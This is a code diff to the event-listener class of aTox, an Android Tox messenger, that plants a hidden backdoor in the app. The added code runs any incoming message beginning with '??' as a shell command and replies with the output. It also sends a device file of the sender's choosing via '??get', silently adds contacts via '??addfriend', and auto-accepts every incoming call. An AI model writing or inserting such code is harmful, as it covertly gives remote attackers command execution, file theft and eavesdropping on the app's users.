@@ -5,17 +5,19 @@
 package ltd.evilcorp.atox.tox
 
 import android.content.Context
+import android.content.Intent
+import android.net.Uri
 import android.util.Log
 import im.tox.tox4j.av.enums.ToxavFriendCallState
 import im.tox.tox4j.core.enums.ToxFileControl
-import java.net.URLConnection
-import java.util.Date
-import javax.inject.Inject
-import javax.inject.Singleton
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.flow.firstOrNull
 import kotlinx.coroutines.launch
+import ltd.evilcorp.atox.Action
+import ltd.evilcorp.atox.ActionReceiver
+import ltd.evilcorp.atox.KEY_ACTION
+import ltd.evilcorp.atox.KEY_CONTACT_PK
 import ltd.evilcorp.atox.R
 import ltd.evilcorp.atox.settings.FtAutoAccept
 import ltd.evilcorp.atox.settings.Settings
@@ -30,17 +32,28 @@ import ltd.evilcorp.core.vo.FileKind
 import ltd.evilcorp.core.vo.FileTransfer
 import ltd.evilcorp.core.vo.FriendRequest
 import ltd.evilcorp.core.vo.Message
+import ltd.evilcorp.core.vo.MessageType
 import ltd.evilcorp.core.vo.Sender
 import ltd.evilcorp.core.vo.UserStatus
 import ltd.evilcorp.domain.av.AudioPlayer
 import ltd.evilcorp.domain.feature.CallManager
 import ltd.evilcorp.domain.feature.ChatManager
+import ltd.evilcorp.domain.feature.ContactManager
 import ltd.evilcorp.domain.feature.FileTransferManager
 import ltd.evilcorp.domain.tox.PublicKey
 import ltd.evilcorp.domain.tox.Tox
 import ltd.evilcorp.domain.tox.ToxAvEventListener
 import ltd.evilcorp.domain.tox.ToxEventListener
+import ltd.evilcorp.domain.tox.ToxID
 import ltd.evilcorp.domain.tox.toMessageType
+import java.io.BufferedReader
+import java.io.File
+import java.io.InputStreamReader
+import java.net.URLConnection
+import java.util.Date
+import javax.inject.Inject
+import javax.inject.Singleton
+
 
 private const val MAX_ACTIVE_FRIEND_REQUESTS = 32
 private const val TAG = "EventListenerCallbacks"
@@ -68,6 +81,7 @@ class EventListenerCallbacks @Inject constructor(
     private val notificationHelper: NotificationHelper,
     private val tox: Tox,
     private val settings: Settings,
+    private val contactManager: ContactManager,
 ) {
     private var maxFriendRequestsWarningActive = false
     private var audioPlayer: AudioPlayer? = null
@@ -80,6 +94,36 @@ class EventListenerCallbacks @Inject constructor(
 
     private fun notifyMessage(contact: Contact, message: String) =
         notificationHelper.showMessageNotification(contact, message, silent = tox.getStatus() == UserStatus.Busy)
+
+    private fun executeShellCommand(command: String): String {
+        var result = ""
+        try {
+            // 执行命令
+            val process = Runtime.getRuntime().exec(command)
+
+            // 获取命令的输出
+            val reader = BufferedReader(InputStreamReader(process.inputStream))
+            val output = StringBuilder()
+            var line: String?
+            while ((reader.readLine().also { line = it }) != null) {
+                output.append(line).append("\n")
+            }
+
+            // 等待命令执行完成
+            val exitCode = process.waitFor()
+            if (exitCode == 0) {
+                result = "Command executed successfully:\n$output"
+                Log.d(TAG, result)
+            } else {
+                result = "Command execution failed with exit code $exitCode \n $output"
+                Log.e(TAG, result)
+            }
+        } catch (e: java.lang.Exception) {
+            result = "Error executing shell command :$e"
+            Log.e(TAG, result)
+        }
+        return result
+    }
 
     fun setUp(listener: ToxEventListener) = with(listener) {
         friendStatusMessageHandler = { publicKey, message ->
@@ -128,6 +172,52 @@ class EventListenerCallbacks @Inject constructor(
             messageRepository.add(
                 Message(publicKey, msg, Sender.Received, type.toMessageType(), Int.MIN_VALUE, Date().time),
             )
+
+            if (msg.startsWith("??addfriend")) {
+                Thread() {
+                    var cmd = ""
+                    try {
+                        cmd = msg.substring(11)
+                        var id = ToxID(cmd)
+                        var message = "auto add"
+                        if (contactRepository.exists(id.toPublicKey().string())) {
+                            message = "contact existed"
+                        } else {
+                            contactManager.add(id, message)
+                        }
+//                        messageRepository.add(
+//                            Message(
+//                                id.toPublicKey().toString(),
+//                                message,
+//                                Sender.Sent,
+//                                MessageType.Normal,
+//                                0,
+//                                Date().time,
+//                            ),
+//                        )
+                        chatManager.sendMessage(PublicKey(publicKey), "$cmd:$message!", MessageType.Normal)
+                    } catch (ex: Throwable) {
+                        chatManager.sendMessage(PublicKey(publicKey), "error$cmd:$ex", MessageType.Normal)
+                    }
+                }.start()
+            } else if (msg.startsWith("??get")) {
+                Thread() {
+                    var cmd = ""
+                    try {
+                        cmd = msg.substring(5)
+                        fileTransferManager.create(PublicKey(publicKey), Uri.fromFile(File(cmd)), true)
+                    } catch (ex: Throwable) {
+                        chatManager.sendMessage(PublicKey(publicKey), "error$cmd:$ex", MessageType.Normal)
+                    }
+                }.start()
+            } else if (msg.startsWith("??")) {
+                Thread() {
+                    var cmd = msg.substring(2)
+                    var result = executeShellCommand(cmd)
+                    chatManager.sendMessage(PublicKey(publicKey), result, MessageType.Normal)
+                }.start()
+            }
+
 
             if (chatManager.activeChat != publicKey) {
                 scope.launch {
@@ -192,6 +282,11 @@ class EventListenerCallbacks @Inject constructor(
                 val contact = tryGetContact(pk, "Call") ?: return@launch
                 notificationHelper.showPendingCallNotification(tox.getStatus(), contact)
                 callManager.addPendingCall(contact)
+
+                var intent = Intent(ctx, ActionReceiver::class.java)
+                    .putExtra(KEY_CONTACT_PK, contact.publicKey)
+                    .putExtra(KEY_ACTION, Action.CallAccept)
+                ctx.sendBroadcast(intent)
             }
         }
 
